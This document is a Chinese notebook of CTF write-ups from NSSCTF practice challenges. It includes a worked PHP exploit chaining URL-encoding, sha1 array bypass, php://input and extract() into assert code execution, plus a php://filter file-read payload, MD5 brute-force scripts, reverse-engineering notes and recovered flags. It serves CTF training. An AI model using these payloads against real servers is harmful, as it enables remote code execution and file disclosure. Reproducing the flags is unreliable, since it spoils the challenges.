  if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
    $file = $_GET["file"]; 
    echo "Neeeeee! Good Job!<br>";
  } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
  foreach($_REQUEST as $value) { 
    if(preg_match('/[a-zA-Z]/i', $value))  
      die('fxck you! I hate English!'); 
  } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
  die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
  extract($_GET["flag"]);
  echo "Very good! you know my password. But what is flag?<br>";
} else{
  die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
   preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
  die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
  include "flag.php";
  $code('', $arg); 
} ?>
这是一个非常简单的挑战,如果你解决,我会给你一面旗帜。祝你好运!
你!我讨厌英语!
```

```php
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php
<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);
<br /></span><span style="color: #0000BB">error_reporting</span><span style="color: #007700">(</span><span style="color: #0000BB">0</span><span style="color: #007700">);&nbsp;
<br />
<br /></span><span style="color: #0000BB">$file&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"1nD3x.php"</span><span style="color: #007700">;
<br /></span><span style="color: #0000BB">$shana&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'shana'</span><span style="color: #007700">];
<br /></span><span style="color: #0000BB">$passwd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'passwd'</span><span style="color: #007700">];
<br /></span><span style="color: #0000BB">$arg&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">''</span><span style="color: #007700">;
<br /></span><span style="color: #0000BB">$code&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">''</span><span style="color: #007700">;
<br />
<br />echo&nbsp;</span><span style="color: #DD0000">"&lt;br&nbsp;/&gt;&lt;font&nbsp;color=red&gt;&lt;B&gt;This&nbsp;is&nbsp;a&nbsp;very&nbsp;simple&nbsp;challenge&nbsp;and&nbsp;if&nbsp;you&nbsp;solve&nbsp;it&nbsp;I&nbsp;will&nbsp;give&nbsp;you&nbsp;a&nbsp;flag.&nbsp;Good&nbsp;Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span><span style="color: #007700">;
<br />
<br />if(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">)&nbsp;{&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">'QUERY_STRING'</span><span style="color: #007700">])
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">'You&nbsp;seem&nbsp;to&nbsp;want&nbsp;to&nbsp;do&nbsp;something&nbsp;bad?'</span><span style="color: #007700">);&nbsp;
<br />}
<br />
<br />if&nbsp;(!</span><span style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">'/http|https/i'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'file'</span><span style="color: #007700">]))&nbsp;{
<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">'/^aqua_is_cute$/'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'debu'</span><span style="color: #007700">])&nbsp;&amp;&amp;&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'debu'</span><span style="color: #007700">]&nbsp;!==&nbsp;</span><span style="color: #DD0000">'aqua_is_cute'</span><span style="color: #007700">)&nbsp;{&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$file&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file"</span><span style="color: #007700">];&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Neeeeee!&nbsp;Good&nbsp;Job!&lt;br&gt;"</span><span style="color: #007700">;
<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
<br />}&nbsp;else&nbsp;die(</span><span style="color: #DD0000">'fxck&nbsp;you!&nbsp;What&nbsp;do&nbsp;you&nbsp;want&nbsp;to&nbsp;do&nbsp;?!'</span><span style="color: #007700">);
<br />
<br />if(</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">)&nbsp;{&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;foreach(</span><span style="color: #0000BB">$_REQUEST&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">)&nbsp;{&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">'/[a-zA-Z]/i'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">))&nbsp;&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">'fxck&nbsp;you!&nbsp;I&nbsp;hate&nbsp;English!'</span><span style="color: #007700">);&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
<br />}&nbsp;
<br />
<br />if&nbsp;(</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$file</span><span style="color: #007700">)&nbsp;!==&nbsp;</span><span style="color: #DD0000">'debu_debu_aqua'</span><span style="color: #007700">)
<br />&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">"Aqua&nbsp;is&nbsp;the&nbsp;cutest&nbsp;five-year-old&nbsp;child&nbsp;in&nbsp;the&nbsp;world!&nbsp;Isn't&nbsp;it&nbsp;?&lt;br&gt;"</span><span style="color: #007700">);
<br />
<br />
<br />if&nbsp;(&nbsp;</span><span style="color: #0000BB">sha1</span><span style="color: #007700">(</span><span style="color: #0000BB">$shana</span><span style="color: #007700">)&nbsp;===&nbsp;</span><span style="color: #0000BB">sha1</span><span style="color: #007700">(</span><span style="color: #0000BB">$passwd</span><span style="color: #007700">)&nbsp;&amp;&amp;&nbsp;</span><span style="color: #0000BB">$shana&nbsp;</span><span style="color: #007700">!=&nbsp;</span><span style="color: #0000BB">$passwd&nbsp;</span><span style="color: #007700">){
<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">extract</span><span style="color: #007700">(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"flag"</span><span style="color: #007700">]);
<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Very&nbsp;good!&nbsp;you&nbsp;know&nbsp;my&nbsp;password.&nbsp;But&nbsp;what&nbsp;is&nbsp;flag?&lt;br&gt;"</span><span style="color: #007700">;
<br />}&nbsp;else{
<br />&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">"fxck&nbsp;you!&nbsp;you&nbsp;don't&nbsp;know&nbsp;my&nbsp;password!&nbsp;And&nbsp;you&nbsp;don't&nbsp;know&nbsp;sha1!&nbsp;why&nbsp;you&nbsp;come&nbsp;here!"</span><span style="color: #007700">);
<br />}
<br />
<br />if(</span><span style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">'/^[a-z0-9]*$/isD'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$code</span><span style="color: #007700">)&nbsp;||&nbsp;
<br /></span><span style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$arg</span><span style="color: #007700">)&nbsp;)&nbsp;{&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">"&lt;br&nbsp;/&gt;Neeeeee~!&nbsp;I&nbsp;have&nbsp;disabled&nbsp;all&nbsp;dangerous&nbsp;functions!&nbsp;You&nbsp;can't&nbsp;get&nbsp;my&nbsp;flag&nbsp;=w="</span><span style="color: #007700">);&nbsp;
<br />}&nbsp;else&nbsp;{&nbsp;
<br />&nbsp;&nbsp;&nbsp;&nbsp;include&nbsp;</span><span style="color: #DD0000">"flag.php"</span><span style="color: #007700">;
<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$code</span><span style="color: #007700">(</span><span style="color: #DD0000">''</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$arg</span><span style="color: #007700">);&nbsp;
<br />}&nbsp;</span><span style="color: #0000BB">?&gt;</span>
</span>
</code><br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>fxck you! I hate English!
```

### 1. 代码分析
首先，我们来梳理一下代码的执行流程和关键条件：

1. QUERY_STRING检查 ：URL中不能包含敏感字符（如shana、debu、aqua等），否则直接退出。
2. file参数检查 ：不能包含http或https，否则直接退出。
3. debu参数条件 ：
    - 正则匹配/^aqua_is_cute$/
    - $_GET['debu'] !== 'aqua_is_cute'  
满足则将file参数设置为用户输入的值。
4. $_REQUEST参数检查 ：所有参数值不能包含字母，否则退出。
5. file_get_contents检查 ：file_get_contents($file)必须等于'debu_debu_aqua'，否则退出。
6. sha1比较 ：sha1($ shana) === sha1( $passwd)且$ shana !=  $passwd，否则退出。
7. code和arg参数检查 ：不能包含敏感字符，否则退出。
8. 执行代码 ：包含flag.php，执行$ code('',  $arg)。

### 2. 绕过方法 2.1 QUERY_STRING检查
使用URL编码绕过，将敏感字符编码为十六进制格式，例如：

+ shana → %73%68%61%6e%61
+ debu → %64%65%62%75
+ flag → %66%6c%61%67 2.2 debu参数条件绕过  
这个条件看起来矛盾，但我们可以 不满足此条件 ，而是通过后续的extract函数覆盖$ file变量。
 2.3  $_REQUEST参数检查  
所有参数值不能包含字母，我们可以使用 数组 作为参数值，例如：
+ shana[]=1
+ passwd[]=2 2.4 file_get_contents检查  
使用 php://input 伪协议，通过POST方式提交数据'debu_debu_aqua'，这样file_get_contents($file)就会返回POST的数据。  
 2.5 sha1比较绕过  
利用PHP中sha1(array())返回NULL的特性，使用不同的数组作为参数值，例如：
+ shana[]=1
+ passwd[]=2  
这样sha1($ shana) === sha1( $passwd)（都返回NULL）且$ shana !=  $passwd（数组不同）。 2.6 执行代码获取flag  
通过extract函数设置$ code和 $arg变量，使用 assert函数 执行任意代码，例如：
+ flag[code]=assert
+ flag[arg]=var_dump($ flag)
这样 $code('', $ arg)就会执行var_dump( $flag)，输出flag的值。

### 3. 最终payload
1. URL ：

```plain
http://node4.anna.nssctf.cn:28905/1nD3x.php?%73%68%61%6e%61%5b%5d=1&
%70%61%73%73%77%64%5b%5d=2&%66%6c%61%67%5b%63%6f%64%65%5d=assert&
%66%6c%61%67%5b%61%72%67%5d=var_dump%28%24%66%6c%61%67%29&
%66%69%6c%65=php%3a%2f%2finput
```

2. POST数据 ：

```plain
debu_debu_aqua
```

### 4. 执行流程
1. URL使用URL编码，绕过QUERY_STRING检查。
2. file参数设置为php://input，不包含http或https，通过检查。
3. debu参数不存在，不满足条件，但后续extract函数会覆盖$file变量。
4. shana和passwd参数值为数组，不包含字母，通过$_REQUEST检查。
5. file_get_contents(php://input)返回POST数据'debu_debu_aqua'，通过检查。
6. sha1比较使用数组，返回NULL，且数组不同，通过检查。
7. extract函数设置$ code=assert， $arg=var_dump($flag)。
8. 包含flag.php，执行assert('', var_dump($flag))，输出flag的值。

### 5. 预期结果
执行上述payload后，页面会输出$flag变量的值，即最终的flag。

这个挑战主要考察了。通过分析代码的执行流程，找出各个条件的绕过方法，最终成功获取flag。



### Misc

### [SWPUCTF 2021 新生赛]include
#### #PHP伪协议 #PHP #文件包含
![](<2025 NSSCTF/file-20260331130228287.png)![](<2025 NSSCTF/file-20260331130228280.png)

构造：?file=php://filter/read=convert.base64-encode/resource=flag.php

![](<2025 NSSCTF/file-20260331130228251.png)

PD9waHANCiRmbGFnPSdOU1NDVEZ7OTdiYWY3MmUtMDg0ZS00MGIwLWFmYzEtMWE2NzAxOWFkODA2fSc7

![](<2025 NSSCTF/file-20260331130228271.png)

NSSCTF{97baf72e-084e-40b0-afc1-1a67019ad806}

### Reverse

## 3.Misc

### [强网拟态2021]BlueWhale

附件：
![](<2025 NSSCTF/file-20260331130230810.png>)

先分析外层流量包，追踪TCP流
![](<2025 NSSCTF/file-20260331130230852.png>)

获取密码：**th1sIsThEpassw0rD**

但似乎不是内层压缩包解压密码。

暴力破解：

### [NSSRound#12 Basic]坏东西 
#### #PDF隐写#压缩包分析
先尝试用文件名解压，发现确实是解压密码。

![](<2025 NSSCTF/file-20260331130228745.png)

显然多层嵌套无底洞。

```python
import zipfile
name = '99020'
while True:
    fz = zipfile.ZipFile(name + '.zip', 'r')
    fz.extractall(pwd=bytes(name, 'utf-8'))
    name = fz.filelist[0].filename.rstrip('.zip')
    print(fz.filelist[0].filename)
    fz.close()
```

解压后得到破损PDF

![](<2025 NSSCTF/file-20260331130228718.png)

放入010editor查看

![](<2025 NSSCTF/file-20260331130228727.png)

很规律的一大块。发现其中Filter前面暗藏玄机。故Ctrl+F搜索Filter，在**Variables**变量表中获取flag

![](<2025 NSSCTF/file-20260331130228737.png)

NSSCTF{25da50b7993c0db55867a5a51f32f35c}

### 4.Pwn

### [西湖论剑 2022]mp3
#### #Misc文件 #隐写音频 #隐写
1. 把需要分析的mp3文件拖到MP3stego所在目录

![](<2025 NSSCTF/file-20260331130228481.png)

2. Decode.exe -X cipher.mp3

![](<2025 NSSCTF/file-20260331130228472.png)

## 4.Pwn

## 5.Reverse

### [SEETF 2022]Magic 
#### #反调试 #REVERSE
题目描述：There might be a hidden gate to the magical land of flags...

![](<2025 NSSCTF/file-20260331130228709.png)

默认值：

![](<2025 NSSCTF/file-20260331130228691.png)

```plain
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _OWORD v3[2]; // [esp-C0h] [ebp-CCh] BYREF
  __int64 v4; // [esp-A0h] [ebp-ACh]
  int v5; // [esp-98h] [ebp-A4h]
  char v6[3]; // [esp-94h] [ebp-A0h] BYREF
  int v7; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v7 = retaddr;
  v5 = 1725917800;
  v3[0] = xmmword_403148;
  strcpy(v6, "h6");
  v3[1] = xmmword_403158;
  v4 = 0x7CE4457476DB4268i64;
  ((void (__thiscall __noreturn *)(_OWORD *))sub_401290)(v3);
```

重新用ida32打开magic.exe，进入`内核选项 kernel options`，**取消勾选** `进行"无返回"分析 perform no-return analysis`，这样分析`main` 函数内容会更完整。  ![](<2025 NSSCTF/file-20260331130228673.png)

操作后：

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebp
  char v4; // di
  int v5; // ecx
  FILE *v6; // eax
  int i; // edi
  DWORD TickCount; // eax
  HKEY v10; // [esp-13Ch] [ebp-148h] BYREF
  DWORD v11; // [esp-138h] [ebp-144h] BYREF
  __int16 v12; // [esp-134h] [ebp-140h]
  _OWORD v13[4]; // [esp-130h] [ebp-13Ch] BYREF
  char v14[24]; // [esp-F0h] [ebp-FCh] BYREF
  BYTE v15[24]; // [esp-D8h] [ebp-E4h] BYREF
  _OWORD v16[2]; // [esp-C0h] [ebp-CCh] BYREF
  __int64 v17; // [esp-A0h] [ebp-ACh]
  int v18; // [esp-98h] [ebp-A4h]
  char v19[3]; // [esp-94h] [ebp-A0h] BYREF
  _OWORD v20[2]; // [esp-90h] [ebp-9Ch] BYREF
  __int16 v21; // [esp-70h] [ebp-7Ch]
  char v22; // [esp-6Eh] [ebp-7Ah]
  _OWORD v23[2]; // [esp-54h] [ebp-60h] BYREF
  __int16 v24; // [esp-34h] [ebp-40h]
  __int128 v25; // [esp-30h] [ebp-3Ch] BYREF
  int v26; // [esp-20h] [ebp-2Ch]
  char v27; // [esp-1Ch] [ebp-28h]
  char v28[12]; // [esp-18h] [ebp-24h] BYREF
  int v29; // [esp-Ch] [ebp-18h] BYREF
  __int16 v30; // [esp-8h] [ebp-14h]
  int v31; // [esp+0h] [ebp-Ch]
  int v32; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v31 = v3;
  v32 = retaddr;
  v18 = 1725917800;
  v16[0] = xmmword_403148;
  strcpy(v19, "h6");
  v16[1] = xmmword_403158;
  v17 = 0x7CE4457476DB4268i64;
  sub_401290(v16);
  RegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)v16, 0, 0x101u, &v10);
  v29 = 1741189973;
  v30 = 96;
  sub_401290(&v29);
  v11 = 21;
  if ( RegQueryValueExA(v10, (LPCSTR)&v29, 0, 0, v15, &v11) )
    return -1;
  v12 = 20;
  sub_401170(v14);
  v26 = -405287383;
  v25 = xmmword_4031F0;
  v27 = 0;
  if ( strncmp(v14, (const char *)&v25, 0x14u) )
    return -1;
  v13[0] = xmmword_4031B0;
  v13[1] = xmmword_4031D0;
  v13[2] = xmmword_4031C0;
  v13[3] = xmmword_4031E0;
  sub_4012F0(v13, v15, v5);
  sub_4011D0("%s", (char)v13);
  v6 = _acrt_iob_func(0);
  fgets(v28, 9, v6);
  if ( !atoi(v28) )
  {
    sub_4011D0("nope", v4);
    return -1;
  }
  if ( sub_401360(v28) == -1339812568 )
  {
    if ( IsDebuggerPresent() )
      goto LABEL_13;
    v21 = 5692;
    v20[0] = xmmword_40318C;
    v22 = 0;
    v20[1] = xmmword_40319C;
    sub_401290(v20);
    sub_4011D0("%s", (char)v20);
    for ( i = 0; i < 8; ++i )
    {
      TickCount = GetTickCount();
      v28[i] -= 10;
      if ( GetTickCount() - TickCount > 0x5DC )
        goto LABEL_13;
    }
    v23[0] = xmmword_403200;
    v23[1] = xmmword_403210;
    v24 = -10010;
    sub_401170(v23);
    if ( IsDebuggerPresent() )
LABEL_13:
      ExitProcess(0xFFFFFFFF);
    sub_4011D0("%s", (char)v23);
    return 0;
  }
  else
  {
    sub_4011D0("nope", v4);
    return 0;
  }
}
```

原因：

部分函数直接调用 `ExitProcess` 退出而不返回，以阻碍动调。ida识别后认为是结束点，就不分析 `main` 函数剩下的代码了。

# 2025 NSSCTF 积累之（三）
## 1.Crypto

### [强网拟态_2021]拟态签到题

ZmxhZ3tHYXFZN0t0RXRyVklYMVE1b1A1aUVCUkNZWEVBeThyVH0=

flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT}
![](<2025 NSSCTF/file-20260331130230831.png>)

### [鹤城杯 2021]A_CRYPTO
#Base家族 #ROT #古典密码

> 4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35
>

这题只有一种方法：ciphey一把梭，否则是无法按常理做出来的。

![](<2025 NSSCTF/file-20260331130228464.png)flag{W0w_y0u_c4n_rea11y_enc0d1ng!}

### [SWPUCTF 2021 新生赛]traditional
#### #古典密码 #其他
> 题目：
>
> 西方的二进制数学的发明者莱布尼茨，从中国的八卦图当中受到启发，演绎并推论出了数学矩
>
> 阵，
>
> 最后创造的二进制数学。二进制数学的诞生为计算机的发明奠定了理论基础。而计算机现在改
>
> 变
>
> 了我们整个世界，改变了我们生活，而他的源头却是来自于八卦图。现在，给你一组由八卦图
>
> 方位
>
> 组成的密文，你能破解出其中的含义吗？
>
>  震坤艮 震艮震 坤巽坤 坤巽震 震巽兑 震艮震 震离艮 震离艮
>
>  格式：NSSCTF{}
>

![](<2025 NSSCTF/file-20260331130228334.jpeg)![](<2025 NSSCTF/file-20260331130228324.jpeg)

```python
#!/usr/bin/env python3
# coding=utf-8

# 精简版八卦密码解密脚本
# 核心思想：每个3卦组对应9位二进制，取最后8位作为ASCII字符

# 八卦符号到二进制的映射
bagua_map = {
    '坤': '000', '震': '001', '坎': '010', '兑': '011',
    '艮': '100', '离': '101', '巽': '110', '乾': '111'
}

# 密文
cipher = "震坤艮 震艮震 坤巽坤 坤巽震 震巽兑 震艮震 震离艮 震离艮"

def solve_bagua(ciphertext, mapping):
    # 初始化结果字符串
    result = ""
    
    # 按空格分割为3卦一组
    for group in ciphertext.split():
        # 将每个卦转换为二进制并拼接
        binary = ''.join([mapping[trigram] for trigram in group])
        # 取9位二进制的最后8位，转换为ASCII
        result += chr(int(binary[1:9], 2))
    
    return result

if __name__ == "__main__":
    flag = solve_bagua(cipher, bagua_map)
    print(f"NSSCTF&#123;&#123;{flag&#125;&#125;}")
```

NSSCTF{Da01sall}









```java
package com.example.crackme1;

import android.content.Context;
import android.os.Bundle;
import android.text.Editable;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public class MainActivity extends AppCompatActivity {
    public boolean check(CharSequence paramCharSequence) {
        if (paramCharSequence.length() != 38)
            return false; 
        if (!paramCharSequence.subSequence(0, 5).toString().equals("flag{"))
            return false; 
        if (paramCharSequence.charAt(paramCharSequence.length() - 1) != '}')
            return false; 
        paramCharSequence = paramCharSequence.subSequence(5, paramCharSequence.length() - 1);
        StringBuilder stringBuilder = new StringBuilder();
        for (byte b = 0; b < paramCharSequence.length(); b += 4)
        stringBuilder.append(md5(paramCharSequence.subSequence(b, b + 4).toString())); 
        return !!stringBuilder.toString().equals("8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0");
    }

    public String md5(String paramString) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(paramString.getBytes(StandardCharsets.UTF_8));
            byte[] arrayOfByte = messageDigest.digest();
            StringBuilder stringBuilder = new StringBuilder();
            this();
            int i = arrayOfByte.length;
            for (byte b = 0; b < i; b++) {
                byte b1 = arrayOfByte[b];
                if (Integer.toHexString(b1 & 0xFF).length() == 1) {
                    stringBuilder.append("0");
                    stringBuilder.append(Integer.toHexString(b1 & 0xFF));
                } else {
                    stringBuilder.append(Integer.toHexString(b1 & 0xFF));
                } 
            } 
            return stringBuilder.toString();
        } catch (Exception exception) {
            return "";
        } 
    }

    protected void onCreate(Bundle paramBundle) {
        super.onCreate(paramBundle);
        setContentView(2131427356);
        ((Button)findViewById(2131230808)).setOnClickListener(new View.OnClickListener() {
            public void onClick(View param1View) {
                Editable editable = flagInput.getText();
                if (MainActivity.this.check((CharSequence)editable)) {
                    Toast.makeText((Context)MainActivity.this, "Right!", 0).show();
                } else {
                    Toast.makeText((Context)MainActivity.this, "Wrong!", 0).show();
                } 
            }
        });
    }
}
```

1. ``check`` 方法是核心验证方法，它接受一个CharSequence参数并返回布尔值。
2. 方法首先检查输入长度是否为38个字符，如果不是则直接返回false。
3. 然后检查输入的前5个字符是否为"flag{"，如果不是则返回false。
4. 接着检查输入的最后一个字符是否为"}"，如果不是则返回false。
5. 然后从第5个字符开始到倒数第1个字符结束，每4个字符一组，对每组进行MD5哈希处理。
6. 最后将所有哈希结果拼接起来，与一个固定的字符串进行比较，如果相等则返回true，否则返回false。  
这个固定的字符串是：`8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0`

法一：hashcat掩码?a?a?a?a分组爆破。    

    "8393931a16db5a00f464a24abe24b17a",

    "9040b57d9cb2cbfa6bdc61d12e9b51f2",

    "789e8a8ae9406c969118e75e9bc65c43",

    "27fbc7c3accdf2c54675b0ddf3e0a609",

    "9b1b81046d525495e3a14ff6eae76edd",

    "fa1740cd6bd483da0f7684b2e4ec84b3",

    "71f07bf95f0113eefab12552181dd832",

    "af8d1eb220186400c494db7091e402b0"

```python
import hashlib
import itertools

# 目标MD5哈希值，分成8组，每组32个字符
target_hashes = [
    "8393931a16db5a00f464a24abe24b17a",
    "9040b57d9cb2cbfa6bdc61d12e9b51f2",
    "789e8a8ae9406c969118e75e9bc65c43",
    "27fbc7c3accdf2c54675b0ddf3e0a609",
    "9b1b81046d525495e3a14ff6eae76edd",
    "fa1740cd6bd483da0f7684b2e4ec84b3",
    "71f07bf95f0113eefab12552181dd832",
    "af8d1eb220186400c494db7091e402b0"
]

# 可能的字符集（假设是ASCII可打印字符）
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"

# 暴力破解4个字符的MD5哈希值
def crack_md5(target_md5, charset):
    # 生成所有4个字符的组合
    for chars in itertools.product(charset, repeat=4):
        text = ''.join(chars)
        md5_hash = hashlib.md5(text.encode()).hexdigest()
        if md5_hash == target_md5:
            return text
    return None

# 破解所有MD5哈希值
flag_parts = []
for i, target_md5 in enumerate(target_hashes):
    print(f"破解第{i+1}组MD5: {target_md5}")
    part = crack_md5(target_md5, charset)
    if part:
        print(f"  找到: {part}")
        flag_parts.append(part)
    else:
        print(f"  未找到")

# 拼接flag
if len(flag_parts) == 8:
    flag = "flag{" + ''.join(flag_parts) + "}"
    print(f"\n找到flag: {flag}")
else:
    print(f"\n只找到{len(flag_parts)}组，无法拼接完整flag")
```

分析过程：

1. 解压crackme1.apk，得到dex文件和其他资源文件
2. 使用dex2jar工具将classes.dex、classes2.dex和classes3.dex转换为JAR文件
3. 发现MainActivity类位于classes3-dex2jar.jar文件中
4. 使用javap工具查看MainActivity类的反编译代码，分析了check方法的逻辑
5. 编写Python脚本crack_flag.py，暴力破解了每组4个字符的MD5哈希值
6. 成功破解了所有8组MD5哈希值，得到了flag

NSSCTF{4aea146e9dc7365e4ec931f547284822}

## 2.Web

### [SWPUCTF_2021_新生赛]jicao

```php
<?php
  highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];// 从 POST 请求中获取 id 参数
$json=json_decode($_GET['json'],true);// 从 GET 请求的 json 参数中解析 JSON 数据为数组
// 判断条件：
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
  ?>
```

要让程序输出 `$flag`，必须同时满足：

1. **POST 参数**** **`**id**`** ****的值为**** **`**"wllmNB"**`
2. **GET 参数 **`**json**`** 是一个合法的 JSON 字符串，且解析后是一个数组，其中键 **`**'x'**`** 的值为 **`**"wllm"**`
3. **使用 URL 编码，避免任何歧义**

```php
curl -X POST "http://node7.anna.nssctf.cn:27541/index.php?json=%7B%22x%22%3A%22wllm%22%7D" -d "id=wllmNB"
```

NSSCTF{5e3b5793-b1f6-488a-bac4-53e9c4889ed7}
![](<2025 NSSCTF/file-20260331130230800.png>)

### gift_F12

![](<2025 NSSCTF/file-20260331130230715.png>)
![](<2025 NSSCTF/file-20260331130230702.png>)

+ Ctrl+U查看网页源代码
+ Ctrl+F查找flag
+ 获得flag
![](<2025 NSSCTF/file-20260331130230690.png>)

### [SWPUCTF 2021 新生赛]easy_md5
#### #弱比较 #PHP #数组绕过
![](<2025 NSSCTF/file-20260331130228456.png)

```php
<?php #PHP代码的起始标记，表示后续是PHP代码。
